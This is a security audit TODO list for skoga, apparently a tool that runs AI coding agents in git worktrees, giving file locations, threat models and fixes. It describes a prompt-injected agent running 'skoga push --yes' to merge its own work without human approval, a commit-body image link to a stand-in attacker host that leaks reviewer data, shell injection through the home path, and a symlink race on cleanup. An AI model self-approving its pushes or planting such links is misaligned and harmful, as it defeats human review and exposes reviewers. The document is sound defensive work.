# Skoga security TODOs

Findings from an adversarial audit on 2026-05-23. Ordered by triage priority. Each item has the file:line, the threat model, and the proposed fix.

**Status check, 2026-05-25:** every P0 item and the two action-spoof P1 items have shipped. The two remaining items (`safe.directory=*` scoping and symlink-safe worktree cleanup) are explicitly accepted in code comments today; revisit when a real concrete threat appears. P3 markdown-sanitization is partially mitigated by code-block wrapping in `commands::land::fence_for_pr_body` (see the unit tests).

Threat models referenced below:
- **(A)** prompt-injected agent running inside a skoga worktree
- **(B)** colocated unprivileged local user on the same machine

---

## P0 — lock down the daemon and state files

### [x] Add peer-credential check to skogad's unix socket — shipped
- **File:** `crates/skogad/src/server.rs:73-112` (`serve`)
- **Threat:** (B) — `UnixListener::bind` accepts any connection; no `SO_PEERCRED` / `getpeereid` check. Only filesystem perms on the socket and `~/.skoga/` gate access, and `ensure_skoga_home` (`crates/skoga-core/src/paths.rs:272`) doesn't `chmod` either. Any local UID can drive every RPC method.
- **Fix:** in `serve()`, after `accept()`, fetch peer uid (Linux: `SO_PEERCRED`; macOS: `getpeereid`) and reject anything that isn't the daemon owner. Also `chmod 0o700` on `~/.skoga` and `0o600` on `~/.skoga/sock` at bind time.

### [x] Set mode 0o600 on every state, audit, and config write — shipped
- **Files:**
  - `crates/skoga-core/src/session.rs:258-264` (`save`)
  - `crates/skoga-core/src/audit.rs:255-269` (`write_line`)
  - `crates/skoga-core/src/config.rs` (save path)
- **Threat:** (B) — `grep` confirms zero `set_permissions` / `from_mode` calls in `skoga-core`. Files land mode `0o644`. Colocated user reads task strings (likely to contain pasted secrets), full agent tool-call history, Claude session IDs, branch/PR URLs.
- **Fix:** swap `fs::write` for `OpenOptions::new().create(true).write(true).mode(0o600).open(...)?.write_all(...)`, or follow each `fs::write` with `fs::set_permissions(p, Permissions::from_mode(0o600))`. Same treatment for the `OpenOptions::create(true).append(true)` chain in `audit.rs`.

### [x] chmod 0o700 the ~/.skoga directory tree at creation — shipped
- **File:** `crates/skoga-core/src/paths.rs:272` (`ensure_skoga_home`)
- **Threat:** (B) — even with per-file 0o600, directory listings disclose session IDs.
- **Fix:** after every `fs::create_dir_all` in `ensure_skoga_home`, set `0o700`.

---

## P1 — close the agent-self-merges-itself loophole

### [x] Make `skoga push --yes` / `skoga land --yes` un-spoofable by the in-worktree agent — shipped
- **Files:** `crates/skoga-cli/src/commands/push.rs`, `crates/skoga-cli/src/commands/land.rs`
- **Threat:** (A) — lite-mode agent runs as the user with `agent.skip_permissions=true` by default. It can shell out and run `skoga push --yes` against its own session, defeating the worktree-as-safety-primitive pitch. The agent doesn't even need to escape — it just uses skoga's own CLI.
- **Fix options:**
  - Refuse `--yes` when the parent process tree includes the session's tmux/agent.
  - Refuse `--yes` unless the controlling TTY belongs to the dev's shell, not the agent's pty.
  - Require an env var (e.g. `SKOGA_CONFIRM_PUSH=<session-id>`) that the agent can't set because it's injected by the human-facing prompt only.
- The right answer probably combines (1) and (3). Cheapest first: ancestor-process check.

---

## P1 — sandbox hardening (acknowledged tradeoffs to revisit)

### [ ] Scope `safe.directory` to known repo roots instead of `*`
- **Files:** `crates/skoga-git/src/lib.rs:89-101,1632-1648`, `crates/skoga-sandbox/src/lib.rs:1704-1725`
- **Threat:** (A) — code comments explicitly accept this, citing sudoers as the real control. But `*` means any repo the sandbox UID can reach will fire its hooks during a skoga-issued git op. If the dev ever clones an untrusted repo onto a path the sandbox can read, a `.git/hooks/post-checkout` runs as the sandbox user.
- **Fix:** maintain a list of registered repo roots (the dev's known clones) and inject `safe.directory=<root>` per-entry instead of `*`.

### [x] Escape `$SKOGA_HOME` interpolation in the git credential helper — shipped (`posix_single_quote`)
- **File:** `crates/skoga-sandbox/src/lib.rs:1735-1739, 1773-1777`
- **Threat:** narrow — a single quote in `$SKOGA_HOME` (or `$HOME`) breaks out of the quoted `$(cat '…')` and runs arbitrary shell on every credential lookup. The inline comment acknowledges it. Practical exploitability is low (who has `'` in their home path?), but the fix is one line.
- **Fix:** replace `token_path.display()` interpolation with the path after `'` → `'\''` substitution.

---

## P2 — symlink and validation hygiene

### [ ] Symlink-safe worktree cleanup in heavy mode
- **File:** `crates/skoga-git/src/lib.rs:263-274` (`sandbox_aware_remove_dir_all`)
- **Threat:** (A) — `sudo … rm -rf <p>` is run after a "is this the session worktree?" check; the agent owns the worktree contents and can swap intermediate dirs for symlinks between check and exec. `rm -rf` doesn't follow directory symlinks by default, but the TOCTOU on `<p>` itself is real.
- **Fix:** preflight `<p>` with `is_symlink()` and refuse if true; consider `rm -rf --one-file-system` (Linux) or `--` plus an `O_NOFOLLOW` preflight.

### [ ] Validate session IDs at every load boundary
- **File:** `crates/skoga-core/src/session.rs` (`Session::load`)
- **Threat:** none today — `generate_id()` only emits 8 hex chars, so `id.join(...)` can't traverse. But it's one RPC change away from being a path-traversal sink.
- **Fix:** at the top of `load()`, `if !id.chars().all(|c| c.is_ascii_hexdigit()) { bail!("invalid session id") }`. Treat as a defensive invariant.

---

## P3 — reviewer-side risk in PR pipeline

### [ ] Sanitize / strip risky markdown from PR title and body
- **File:** `crates/skoga-cli/src/commands/land.rs` (gh_pr_create call site, `message_body()`)
- **Threat:** (A) — agent commits with body `Fix bug ![](https://attacker/?d=...)`. GitHub renders the image on the reviewer's PR page, leaking IP/UA and enabling per-reviewer payload variation. No skoga-side secret is in the PR-render context, but skoga is the thing publishing un-escaped agent text.
- **Fix:** either strip `![...](...)` patterns from the agent's commit body before handing to `gh pr create --body`, or quote the body inside a fenced code block so it renders as text. Code-block wrap is the lowest-risk option.

---

## Already verified safe (don't waste time)

- **Force-push abuse.** `--force` / `--force-with-lease` are not used anywhere.
- **Branch refspec injection via `params.base`.** Git's refspec parser rejects malformed input pre-exec.
- **`write_git_meta_file` "agent picks filename".** False alarm from initial audit — `name` is a hardcoded literal at every callsite (e.g. `"SKOGA_COMMITMSG"` at `crates/skoga-cli/src/commands/land.rs:857`); only `contents` is agent-influenced and that's the intended payload.
- **Markdown PR body leaking `gh auth token`.** Token isn't in the PR-render context. Risk is reviewer-side tracking pixels (covered in the P3 item), not token theft.
- **Submodules / `.gitattributes` filters / `.git/hooks` install.** None used by skoga.
- **Cargo deps.** Spot-checked — no obvious unmaintained crates, no surprising `build.rs`.
